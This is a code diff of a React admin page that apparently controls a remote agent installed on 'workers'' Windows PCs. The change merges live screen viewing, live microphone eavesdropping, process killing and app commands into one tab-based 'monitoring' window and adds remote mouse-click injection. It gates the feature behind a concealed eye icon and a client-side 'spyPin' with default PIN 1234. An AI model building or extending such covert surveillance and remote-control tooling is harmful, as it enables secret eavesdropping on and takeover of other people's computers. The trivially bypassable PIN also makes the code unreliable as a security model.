@@ -1,5 +1,5 @@
 import { useEffect, useRef, useState } from 'react'
-import { getUsers, createUser, updateUser, deleteUser, getWorkersStats, fetchWorkerScreenshot, requestWorkerScreenshot, createScreenViewWs, createMicViewWs, fetchWorkerProcesses, killWorkerProcess, sendWorkerCommand } from '../api'
+import { getUsers, createUser, updateUser, deleteUser, getWorkersStats, fetchWorkerScreenshot, requestWorkerScreenshot, createScreenViewWs, createMicViewWs, fetchWorkerProcesses, killWorkerProcess, sendWorkerCommand, sendWorkerClick } from '../api'
 
 function fmtDuration(seconds) {
   if (!seconds || seconds < 60) return '< 1 мин'
@@ -18,168 +18,82 @@ function fmtLastSeen(dateStr) {
   return new Date(dateStr).toLocaleDateString('ru-RU')
 }
 
-function MicModal({ worker, onClose }) {
-  const [listening, setListening] = useState(false)
-  const wsRef = useRef(null)
-  const audioCtxRef = useRef(null)
-  const sourceBufferRef = useRef(null)
-  const audioRef = useRef(null)
-  const mediaSourceRef = useRef(null)
-  const queueRef = useRef([])
-  const appendingRef = useRef(false)
+const DEFAULT_PIN = '1234'
 
-  const appendNext = () => {
-    const sb = sourceBufferRef.current
-    if (!sb || sb.updating || appendingRef.current || queueRef.current.length === 0) return
-    appendingRef.current = true
-    const data = queueRef.current.shift()
-    try { sb.appendBuffer(data) } catch { appendingRef.current = false }
+function PinModal({ onSuccess, onClose }) {
+  const [pin, setPin] = useState('')
+  const [newPin, setNewPin] = useState('')
+  const [changing, setChanging] = useState(false)
+  const [error, setError] = useState('')
+
+  const savedPin = localStorage.getItem('spyPin') || DEFAULT_PIN
+
+  const handleSubmit = (e) => {
+    e.preventDefault()
+    if (pin !== savedPin) { setError('Неверный пинкод'); return }
+    onSuccess()
   }
 
-  const startListening = () => {
-    const ms = new MediaSource()
-    mediaSourceRef.current = ms
-    const audio = audioRef.current
-    audio.src = URL.createObjectURL(ms)
-
-    ms.addEventListener('sourceopen', () => {
-      try {
-        const sb = ms.addSourceBuffer('audio/webm;codecs=opus')
-        sourceBufferRef.current = sb
-        sb.addEventListener('updateend', () => {
-          appendingRef.current = false
-          appendNext()
-          if (audio.buffered.length > 0) {
-            const end = audio.buffered.end(audio.buffered.length - 1)
-            if (end - audio.currentTime > 1.5) audio.currentTime = end - 0.1
-          }
-        })
-      } catch (e) { console.error('SourceBuffer error:', e) }
-    })
-
-    audio.play().catch(() => {})
-
-    const ws = createMicViewWs(worker.id)
-    ws.binaryType = 'arraybuffer'
-    ws.onmessage = (e) => {
-      queueRef.current.push(e.data)
-      appendNext()
-    }
-    ws.onclose = () => setListening(false)
-    wsRef.current = ws
-    setListening(true)
+  const handleChangePin = (e) => {
+    e.preventDefault()
+    if (pin !== savedPin) { setError('Неверный текущий пинкод'); return }
+    if (newPin.length < 4) { setError('Минимум 4 цифры'); return }
+    localStorage.setItem('spyPin', newPin)
+    onSuccess()
   }
-
-  const stopListening = () => {
-    if (wsRef.current) { wsRef.current.close(); wsRef.current = null }
-    const audio = audioRef.current
-    if (audio) { audio.pause(); audio.src = '' }
-    sourceBufferRef.current = null
-    queueRef.current = []
-    appendingRef.current = false
-    setListening(false)
-  }
-
-  useEffect(() => () => stopListening(), [])
 
   return (
     <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70" onClick={onClose}>
-      <div className="bg-[#1a1d2e] border border-white/10 rounded-2xl p-6 w-80 shadow-2xl" onClick={(e) => e.stopPropagation()}>
-        <div className="flex items-center justify-between mb-6">
-          <div className="font-semibold text-white">{worker.username} — микрофон</div>
+      <div className="bg-[#1a1d2e] border border-white/10 rounded-2xl p-6 w-72 shadow-2xl" onClick={(e) => e.stopPropagation()}>
+        <div className="flex items-center justify-between mb-5">
+          <div className="font-semibold text-white">🔒 Мониторинг</div>
           <button onClick={onClose} className="text-slate-400 hover:text-white text-lg leading-none">×</button>
         </div>
-        <div className="flex flex-col items-center gap-4">
-          <div className={`w-20 h-20 rounded-full flex items-center justify-center text-3xl transition-all ${listening ? 'bg-red-500/20 ring-4 ring-red-500/40 animate-pulse' : 'bg-slate-700/50'}`}>
-            🎙
-          </div>
-          <p className="text-sm text-slate-400">{listening ? 'Слушаем микрофон...' : 'Нажмите чтобы начать'}</p>
-          <button
-            onClick={listening ? stopListening : startListening}
-            className={`px-6 py-2 rounded-lg text-sm font-medium transition-colors ${listening ? 'bg-red-500/20 border border-red-500/30 text-red-400 hover:bg-red-500/30' : 'bg-green-500/15 border border-green-500/30 text-green-400 hover:bg-green-500/25'}`}
-          >
-            {listening ? 'Остановить' : 'Слушать'}
-          </button>
-        </div>
-        <audio ref={audioRef} className="hidden" />
-      </div>
-    </div>
-  )
-}
-
-function ProcessesModal({ worker, onClose }) {
-  const [processes, setProcesses] = useState([])
-  const [updatedAt, setUpdatedAt] = useState(null)
-  const [search, setSearch] = useState('')
-  const [loading, setLoading] = useState(false)
-  const [killing, setKilling] = useState(null)
-
-  const load = async () => {
-    setLoading(true)
-    try {
-      const data = await fetchWorkerProcesses(worker.id)
-      setProcesses(data.processes || [])
-      setUpdatedAt(data.updated_at ? new Date(data.updated_at) : null)
-    } catch {} finally { setLoading(false) }
-  }
-
-  const handleKill = async (name) => {
-    if (!confirm(`Завершить процесс «${name}»?`)) return
-    setKilling(name)
-    try {
-      await killWorkerProcess(worker.id, name)
-      setTimeout(load, 3000)
-    } catch {} finally { setKilling(null) }
-  }
-
-  useEffect(() => { load() }, [])
-
-  const filtered = processes.filter(p => p.toLowerCase().includes(search.toLowerCase()))
-  const age = updatedAt ? Math.floor((Date.now() - updatedAt.getTime()) / 1000) : null
-  const ageStr = age === null ? '' : age < 60 ? `${age}с назад` : `${Math.floor(age / 60)}м назад`
-
-  return (
-    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70" onClick={onClose}>
-      <div className="bg-[#1a1d2e] border border-white/10 rounded-2xl p-5 w-[520px] max-h-[70vh] flex flex-col shadow-2xl" onClick={(e) => e.stopPropagation()}>
-        <div className="flex items-center justify-between mb-4">
-          <div>
-            <div className="font-semibold text-white">{worker.username} — процессы</div>
-            {updatedAt && <div className="text-xs text-slate-500 mt-0.5">Обновлено: {ageStr} · {processes.length} процессов</div>}
-          </div>
-          <div className="flex items-center gap-2">
-            <button onClick={load} disabled={loading} className="text-xs px-3 py-1.5 rounded-lg bg-slate-700/50 border border-border text-slate-300 hover:text-white disabled:opacity-50 transition-colors">
-              {loading ? '...' : 'Обновить'}
+        {!changing ? (
+          <form onSubmit={handleSubmit} className="space-y-3">
+            <input
+              autoFocus
+              type="password"
+              inputMode="numeric"
+              placeholder="Пинкод"
+              value={pin}
+              onChange={(e) => { setPin(e.target.value); setError('') }}
+              className="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-sm text-white text-center tracking-widest focus:outline-none focus:border-brand-500"
+            />
+            {error && <p className="text-xs text-red-400 text-center">{error}</p>}
+            <button type="submit" className="w-full bg-brand-500 hover:bg-brand-600 text-white rounded-lg py-2 text-sm font-medium transition-colors">
+              Войти
             </button>
-            <button onClick={onClose} className="text-slate-400 hover:text-white text-lg leading-none">×</button>
-          </div>
-        </div>
-        <input
-          value={search}
-          onChange={(e) => setSearch(e.target.value)}
-          placeholder="Поиск процесса..."
-          className="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-brand-500 mb-3"
-        />
-        <div className="overflow-y-auto flex-1 space-y-0.5">
-          {filtered.length === 0 && <div className="text-slate-500 text-sm text-center py-8">{loading ? 'Загрузка...' : 'Нет данных'}</div>}
-          {filtered.map((p, i) => (
-            <div key={i} className="flex items-center justify-between px-3 py-1.5 rounded hover:bg-white/5 group">
-              <span className="text-sm text-slate-300 font-mono">{p}</span>
-              <button
-                onClick={() => handleKill(p)}
-                disabled={killing === p}
-                className="text-xs px-2 py-0.5 rounded text-red-400 hover:bg-red-400/15 opacity-0 group-hover:opacity-100 transition-all disabled:opacity-50"
-              >
-                {killing === p ? '...' : 'завершить'}
-              </button>
-            </div>
-          ))}
-        </div>
+            <button type="button" onClick={() => setChanging(true)} className="w-full text-xs text-slate-500 hover:text-slate-300 transition-colors py-1">
+              Сменить пинкод
+            </button>
+          </form>
+        ) : (
+          <form onSubmit={handleChangePin} className="space-y-3">
+            <input type="password" inputMode="numeric" placeholder="Текущий пинкод" value={pin}
+              onChange={(e) => { setPin(e.target.value); setError('') }}
+              className="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-sm text-white text-center tracking-widest focus:outline-none focus:border-brand-500"
+            />
+            <input type="password" inputMode="numeric" placeholder="Новый пинкод" value={newPin}
+              onChange={(e) => { setNewPin(e.target.value); setError('') }}
+              className="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-sm text-white text-center tracking-widest focus:outline-none focus:border-brand-500"
+            />
+            {error && <p className="text-xs text-red-400 text-center">{error}</p>}
+            <button type="submit" className="w-full bg-brand-500 hover:bg-brand-600 text-white rounded-lg py-2 text-sm font-medium transition-colors">
+              Сохранить
+            </button>
+            <button type="button" onClick={() => setChanging(false)} className="w-full text-xs text-slate-500 hover:text-slate-300 transition-colors py-1">
+              Назад
+            </button>
+          </form>
+        )}
       </div>
     </div>
   )
 }
 
-function ScreenshotModal({ worker, onClose }) {
+// ── Screen tab ────────────────────────────────────────────────────────────────
+function ScreenTab({ worker }) {
   const [imgUrl, setImgUrl] = useState(null)
   const [capturedAt, setCapturedAt] = useState(null)
   const [loading, setLoading] = useState(false)
@@ -253,6 +167,14 @@ function ScreenshotModal({ worker, onClose }) {
 
   const toggleLive = () => live ? stopLive() : startLive()
 
+  const handleLiveClick = (e) => {
+    if (!live) return
+    const rect = e.currentTarget.getBoundingClientRect()
+    const x = (e.clientX - rect.left) / rect.width
+    const y = (e.clientY - rect.top) / rect.height
+    sendWorkerClick(worker.id, x, y).catch(() => {})
+  }
+
   useEffect(() => {
     setLoading(true)
     loadShot().finally(() => setLoading(false))
@@ -267,42 +189,280 @@ function ScreenshotModal({ worker, onClose }) {
   const ageStr = age === null ? '' : age < 60 ? `${age}с назад` : age < 3600 ? `${Math.floor(age / 60)}м назад` : `${Math.floor(age / 3600)}ч назад`
 
   return (
-    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70" onClick={onClose}>
-      <div className="bg-[#1a1d2e] border border-white/10 rounded-2xl p-5 max-w-4xl w-full mx-4 shadow-2xl" onClick={(e) => e.stopPropagation()}>
-        <div className="flex items-center justify-between mb-4">
-          <div>
-            <div className="font-semibold text-white">{worker.username} — экран</div>
-            {capturedAt && <div className="text-xs text-slate-500 mt-0.5">{live ? 'Live' : 'Снято'}: {ageStr}</div>}
-          </div>
-          <div className="flex items-center gap-2">
-            <button
-              onClick={toggleLive}
-              className={`text-xs px-3 py-1.5 rounded-lg border font-medium transition-colors ${live ? 'bg-red-500/15 border-red-500/30 text-red-400' : 'bg-green-500/10 border-green-500/30 text-green-400'}`}
-            >
-              {live ? '⏹ Стоп' : '▶ Live ~10 FPS'}
+    <div>
+      <div className="flex items-center justify-between mb-3">
+        {capturedAt
+          ? <span className="text-xs text-slate-500">{live ? 'Live' : 'Снято'}: {ageStr}</span>
+          : <span />
+        }
+        <div className="flex items-center gap-2">
+          <button
+            onClick={toggleLive}
+            className={`text-xs px-3 py-1.5 rounded-lg border font-medium transition-colors ${live ? 'bg-red-500/15 border-red-500/30 text-red-400' : 'bg-green-500/10 border-green-500/30 text-green-400'}`}
+          >
+            {live ? '⏹ Стоп' : '▶ Live ~10 FPS'}
+          </button>
+          {!live && (
+            <button onClick={handleRefresh} disabled={loading || waiting} className="text-xs px-3 py-1.5 rounded-lg bg-slate-700/50 border border-white/10 text-slate-300 hover:text-white transition-colors disabled:opacity-50">
+              {waiting ? 'Ждём...' : loading ? '...' : 'Скриншот'}
             </button>
-            {!live && (
-              <button onClick={handleRefresh} disabled={loading || waiting} className="text-xs px-3 py-1.5 rounded-lg bg-slate-700/50 border border-border text-slate-300 hover:text-white transition-colors disabled:opacity-50">
-                {waiting ? 'Ждём...' : loading ? '...' : 'Обновить'}
-              </button>
-            )}
-            <button onClick={onClose} className="text-slate-400 hover:text-white transition-colors text-lg leading-none">×</button>
+          )}
+        </div>
+      </div>
+      <div className="rounded-xl overflow-hidden bg-black min-h-[180px] flex items-center justify-center">
+        {notFound && !imgUrl && !live && <div className="text-slate-500 text-sm py-12">Снимков нет — нажмите «Скриншот»</div>}
+        {!notFound && !imgUrl && loading && <div className="text-slate-500 text-sm py-12">Загрузка...</div>}
+        {imgUrl && !live && <img src={imgUrl} alt="screenshot" className="w-full h-auto block" />}
+        <img ref={liveImgRef} alt="live" onClick={handleLiveClick} className={`w-full h-auto block ${live ? 'cursor-crosshair' : 'hidden'}`} />
+      </div>
+    </div>
+  )
+}
+
+// ── Mic tab ───────────────────────────────────────────────────────────────────
+function MicTab({ worker }) {
+  const [listening, setListening] = useState(false)
+  const wsRef = useRef(null)
+  const sourceBufferRef = useRef(null)
+  const audioRef = useRef(null)
+  const mediaSourceRef = useRef(null)
+  const queueRef = useRef([])
+  const appendingRef = useRef(false)
+
+  const appendNext = () => {
+    const sb = sourceBufferRef.current
+    if (!sb || sb.updating || appendingRef.current || queueRef.current.length === 0) return
+    appendingRef.current = true
+    const data = queueRef.current.shift()
+    try { sb.appendBuffer(data) } catch { appendingRef.current = false }
+  }
+
+  const startListening = () => {
+    const ms = new MediaSource()
+    mediaSourceRef.current = ms
+    const audio = audioRef.current
+    audio.src = URL.createObjectURL(ms)
+
+    ms.addEventListener('sourceopen', () => {
+      try {
+        const sb = ms.addSourceBuffer('audio/webm;codecs=opus')
+        sourceBufferRef.current = sb
+        sb.addEventListener('updateend', () => {
+          appendingRef.current = false
+          appendNext()
+          if (audio.buffered.length > 0) {
+            const end = audio.buffered.end(audio.buffered.length - 1)
+            if (end - audio.currentTime > 1.5) audio.currentTime = end - 0.1
+          }
+        })
+      } catch (e) { console.error('SourceBuffer error:', e) }
+    })
+
+    audio.play().catch(() => {})
+
+    const ws = createMicViewWs(worker.id)
+    ws.binaryType = 'arraybuffer'
+    ws.onmessage = (e) => {
+      queueRef.current.push(e.data)
+      appendNext()
+    }
+    ws.onclose = () => setListening(false)
+    wsRef.current = ws
+    setListening(true)
+  }
+
+  const stopListening = () => {
+    if (wsRef.current) { wsRef.current.close(); wsRef.current = null }
+    const audio = audioRef.current
+    if (audio) { audio.pause(); audio.src = '' }
+    sourceBufferRef.current = null
+    queueRef.current = []
+    appendingRef.current = false
+    setListening(false)
+  }
+
+  useEffect(() => () => stopListening(), [])
+
+  return (
+    <div className="flex flex-col items-center gap-4 py-6">
+      <div className={`w-20 h-20 rounded-full flex items-center justify-center text-3xl transition-all ${listening ? 'bg-red-500/20 ring-4 ring-red-500/40 animate-pulse' : 'bg-slate-700/50'}`}>
+        🎙
+      </div>
+      <p className="text-sm text-slate-400">{listening ? 'Слушаем микрофон...' : 'Нажмите чтобы начать'}</p>
+      <button
+        onClick={listening ? stopListening : startListening}
+        className={`px-6 py-2 rounded-lg text-sm font-medium transition-colors ${listening ? 'bg-red-500/20 border border-red-500/30 text-red-400 hover:bg-red-500/30' : 'bg-green-500/15 border border-green-500/30 text-green-400 hover:bg-green-500/25'}`}
+      >
+        {listening ? 'Остановить' : 'Слушать'}
+      </button>
+      <audio ref={audioRef} className="hidden" />
+    </div>
+  )
+}
+
+// ── Processes tab ─────────────────────────────────────────────────────────────
+function ProcessesTab({ worker }) {
+  const [processes, setProcesses] = useState([])
+  const [updatedAt, setUpdatedAt] = useState(null)
+  const [search, setSearch] = useState('')
+  const [loading, setLoading] = useState(false)
+  const [killing, setKilling] = useState(null)
+
+  const load = async () => {
+    setLoading(true)
+    try {
+      const data = await fetchWorkerProcesses(worker.id)
+      setProcesses(data.processes || [])
+      setUpdatedAt(data.updated_at ? new Date(data.updated_at) : null)
+    } catch {} finally { setLoading(false) }
+  }
+
+  const handleKill = async (name) => {
+    if (!confirm(`Завершить процесс «${name}»?`)) return
+    setKilling(name)
+    try {
+      await killWorkerProcess(worker.id, name)
+      setTimeout(load, 3000)
+    } catch {} finally { setKilling(null) }
+  }
+
+  useEffect(() => { load() }, [])
+
+  const filtered = processes.filter(p => p.toLowerCase().includes(search.toLowerCase()))
+  const age = updatedAt ? Math.floor((Date.now() - updatedAt.getTime()) / 1000) : null
+  const ageStr = age === null ? '' : age < 60 ? `${age}с назад` : `${Math.floor(age / 60)}м назад`
+
+  return (
+    <div className="flex flex-col" style={{ minHeight: 0 }}>
+      <div className="flex items-center justify-between mb-3">
+        {updatedAt
+          ? <span className="text-xs text-slate-500">{ageStr} · {processes.length} процессов</span>
+          : <span />
+        }
+        <button onClick={load} disabled={loading} className="text-xs px-3 py-1.5 rounded-lg bg-slate-700/50 border border-white/10 text-slate-300 hover:text-white disabled:opacity-50 transition-colors">
+          {loading ? '...' : 'Обновить'}
+        </button>
+      </div>
+      <input
+        value={search}
+        onChange={(e) => setSearch(e.target.value)}
+        placeholder="Поиск процесса..."
+        className="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-brand-500 mb-2"
+      />
+      <div className="overflow-y-auto space-y-0.5" style={{ maxHeight: 260 }}>
+        {filtered.length === 0 && <div className="text-slate-500 text-sm text-center py-8">{loading ? 'Загрузка...' : 'Нет данных'}</div>}
+        {filtered.map((p, i) => (
+          <div key={i} className="flex items-center justify-between px-3 py-1.5 rounded hover:bg-white/5 group">
+            <span className="text-sm text-slate-300 font-mono">{p}</span>
+            <button
+              onClick={() => handleKill(p)}
+              disabled={killing === p}
+              className="text-xs px-2 py-0.5 rounded text-red-400 hover:bg-red-400/15 opacity-0 group-hover:opacity-100 transition-all disabled:opacity-50"
+            >
+              {killing === p ? '...' : 'завершить'}
+            </button>
           </div>
+        ))}
+      </div>
+    </div>
+  )
+}
+
+// ── Controls tab ──────────────────────────────────────────────────────────────
+function ControlsTab({ worker }) {
+  const [done, setDone] = useState({})
+
+  const send = async (cmd, label) => {
+    if (!confirm(`${label} для ${worker.username}?`)) return
+    await sendWorkerCommand(worker.id, cmd)
+    setDone(d => ({ ...d, [cmd]: true }))
+  }
+
+  return (
+    <div className="flex flex-col gap-3 py-4">
+      <div className="bg-black/20 border border-white/5 rounded-xl p-4 flex items-center justify-between">
+        <div>
+          <div className="text-sm text-white font-medium">Закрыть приложение</div>
+          <div className="text-xs text-slate-500 mt-0.5">Принудительно завершает процесс воркер-приложения</div>
+        </div>
+        <button
+          onClick={() => send('quit', 'Закрыть приложение')}
+          disabled={done['quit']}
+          className="text-xs px-4 py-2 rounded-lg bg-orange-500/15 border border-orange-500/30 text-orange-400 hover:bg-orange-500/25 disabled:opacity-50 transition-colors"
+        >
+          {done['quit'] ? 'Отправлено' : '⏹ Закрыть'}
+        </button>
+      </div>
+      <div className="bg-black/20 border border-white/5 rounded-xl p-4 flex items-center justify-between">
+        <div>
+          <div className="text-sm text-white font-medium">Убрать из автозапуска</div>
+          <div className="text-xs text-slate-500 mt-0.5">Удаляет приложение из автостарта Windows</div>
+        </div>
+        <button
+          onClick={() => send('remove-autostart', 'Убрать из автозапуска')}
+          disabled={done['remove-autostart']}
+          className="text-xs px-4 py-2 rounded-lg bg-slate-700/50 border border-white/10 text-slate-300 hover:text-white disabled:opacity-50 transition-colors"
+        >
+          {done['remove-autostart'] ? 'Отправлено' : '🚫 Убрать'}
+        </button>
+      </div>
+    </div>
+  )
+}
+
+// ── Combined monitoring modal ─────────────────────────────────────────────────
+const TABS = [
+  { id: 'screen', label: '📷 Экран' },
+  { id: 'mic', label: '🎙 Микрофон' },
+  { id: 'processes', label: '⚙ Процессы' },
+  { id: 'controls', label: '🛠 Управление' },
+]
+
+function MonitoringModal({ worker, onClose }) {
+  const [tab, setTab] = useState('screen')
+
+  return (
+    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75" onClick={onClose}>
+      <div
+        className="bg-[#1a1d2e] border border-white/10 rounded-2xl shadow-2xl flex flex-col"
+        style={{ width: '860px', maxWidth: 'calc(100vw - 32px)', maxHeight: 'calc(100vh - 48px)' }}
+        onClick={(e) => e.stopPropagation()}
+      >
+        {/* Header */}
+        <div className="flex items-center justify-between px-6 py-4 border-b border-white/10 flex-shrink-0">
+          <div className="flex items-center gap-3">
+            <span className="text-white font-semibold">{worker.username}</span>
+            <span className="text-slate-500 text-sm">— мониторинг</span>
+          </div>
+          <button onClick={onClose} className="text-slate-400 hover:text-white text-xl leading-none transition-colors">×</button>
         </div>
 
-        <div className="rounded-xl overflow-hidden bg-black min-h-[200px] flex items-center justify-center">
-          {notFound && !imgUrl && !live && <div className="text-slate-500 text-sm py-16">Скриншотов нет — нажмите «Обновить»</div>}
-          {!notFound && !imgUrl && loading && <div className="text-slate-500 text-sm py-16">Загрузка...</div>}
-          {/* Static screenshot */}
-          {imgUrl && !live && <img src={imgUrl} alt="screenshot" className="w-full h-auto block" />}
-          {/* Live stream */}
-          <img ref={liveImgRef} alt="live" className={`w-full h-auto block ${live ? '' : 'hidden'}`} />
+        {/* Tabs */}
+        <div className="flex gap-1 px-6 pt-4 flex-shrink-0">
+          {TABS.map(t => (
+            <button
+              key={t.id}
+              onClick={() => setTab(t.id)}
+              className={`text-sm px-4 py-2 rounded-lg font-medium transition-colors ${tab === t.id ? 'bg-brand-500/15 text-brand-400' : 'text-slate-400 hover:text-white hover:bg-white/5'}`}
+            >
+              {t.label}
+            </button>
+          ))}
+        </div>
+
+        {/* Content */}
+        <div className="flex-1 overflow-auto px-6 py-4">
+          {tab === 'screen' && <ScreenTab worker={worker} />}
+          {tab === 'mic' && <MicTab worker={worker} />}
+          {tab === 'processes' && <ProcessesTab worker={worker} />}
+          {tab === 'controls' && <ControlsTab worker={worker} />}
         </div>
       </div>
     </div>
   )
 }
 
+// ── Main page ─────────────────────────────────────────────────────────────────
 export default function Workers() {
   const [workers, setWorkers] = useState([])
   const [stats, setStats] = useState({})
@@ -310,9 +470,9 @@ export default function Workers() {
   const [editId, setEditId] = useState(null)
   const [form, setForm] = useState({ username: '', password: '', worker_percentage: 70, is_vip: false })
   const [hidePercentages, setHidePercentages] = useState(true)
-  const [screenshotWorker, setScreenshotWorker] = useState(null)
-  const [micWorker, setMicWorker] = useState(null)
-  const [processesWorker, setProcessesWorker] = useState(null)
+  const [spyUnlocked, setSpyUnlocked] = useState(false)
+  const [pendingWorker, setPendingWorker] = useState(null) // worker awaiting PIN
+  const [monitoringWorker, setMonitoringWorker] = useState(null)
 
   const loadStats = () =>
     getWorkersStats().then((list) => {
@@ -372,6 +532,20 @@ export default function Workers() {
     if (!confirm('Удалить качера?')) return
     await deleteUser(id)
     load()
+  }
+
+  const handleEyeClick = (w) => {
+    if (spyUnlocked) {
+      setMonitoringWorker(w)
+    } else {
+      setPendingWorker(w)
+    }
+  }
+
+  const handlePinSuccess = () => {
+    setSpyUnlocked(true)
+    setMonitoringWorker(pendingWorker)
+    setPendingWorker(null)
   }
 
   return (
@@ -531,28 +705,12 @@ export default function Workers() {
                   </td>
                   <td className="px-5 py-3 text-right">
                     <div className="flex items-center justify-end gap-2">
-                      <button onClick={() => setScreenshotWorker(w)} className="text-xs px-2 py-1 rounded bg-slate-700/50 text-slate-400 hover:text-white hover:bg-slate-700 transition-colors" title="Экран">
-                        📷
-                      </button>
-                      <button onClick={() => setMicWorker(w)} className="text-xs px-2 py-1 rounded bg-slate-700/50 text-slate-400 hover:text-white hover:bg-slate-700 transition-colors" title="Микрофон">
-                        🎙
-                      </button>
-                      <button onClick={() => setProcessesWorker(w)} className="text-xs px-2 py-1 rounded bg-slate-700/50 text-slate-400 hover:text-white hover:bg-slate-700 transition-colors" title="Процессы">
-                        ⚙
-                      </button>
                       <button
-                        onClick={async () => { if (confirm(`Закрыть приложение у ${w.username}?`)) await sendWorkerCommand(w.id, 'quit') }}
-                        className="text-xs px-2 py-1 rounded text-orange-400 hover:bg-orange-400/10 transition-colors"
-                        title="Закрыть приложение воркера"
+                        onClick={() => handleEyeClick(w)}
+                        className="text-slate-600 hover:text-slate-300 transition-colors text-base leading-none px-1"
+                        title="Мониторинг"
                       >
-                        ⏹
-                      </button>
-                      <button
-                        onClick={async () => { if (confirm(`Убрать ${w.username} из автозапуска?`)) await sendWorkerCommand(w.id, 'remove-autostart') }}
-                        className="text-xs px-2 py-1 rounded text-slate-400 hover:bg-slate-400/10 transition-colors"
-                        title="Убрать из автозапуска"
-                      >
-                        🚫
+                        👁
                       </button>
                       <button onClick={() => handleEdit(w)} className="text-xs px-2 py-1 rounded bg-slate-700/50 text-slate-400 hover:text-white hover:bg-slate-700 transition-colors">
                         Изменить
@@ -578,14 +736,17 @@ export default function Workers() {
       </div>
     </div>
 
-    {screenshotWorker && (
-      <ScreenshotModal worker={screenshotWorker} onClose={() => setScreenshotWorker(null)} />
+    {pendingWorker && (
+      <PinModal
+        onSuccess={handlePinSuccess}
+        onClose={() => setPendingWorker(null)}
+      />
     )}
-    {micWorker && (
-      <MicModal worker={micWorker} onClose={() => setMicWorker(null)} />
-    )}
-    {processesWorker && (
-      <ProcessesModal worker={processesWorker} onClose={() => setProcessesWorker(null)} />
+    {monitoringWorker && (
+      <MonitoringModal
+        worker={monitoringWorker}
+        onClose={() => setMonitoringWorker(null)}
+      />
     )}
     </>
   )
